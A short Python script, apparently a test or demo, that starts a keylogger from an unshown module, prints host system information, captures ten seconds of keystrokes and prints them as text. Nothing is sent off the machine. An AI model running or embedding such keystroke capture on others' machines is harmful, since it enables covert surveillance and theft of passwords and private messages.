import time
import pcinfo
from keylogger import Keylogger

# Start keylogger
kl = Keylogger()
kl.start()

# Print system info
info = pcinfo.infoPc()
print("System Info:")
print(info)

# Wait while keylogger collects data
time.sleep(10)

# Get keylogger buffer and decode to text
codes = kl.get_buffer()
text = "".join(chr(c) for c in codes)
print("Captured Keys:")
print(text)

# Stop keylogger
kl.stop()
del kl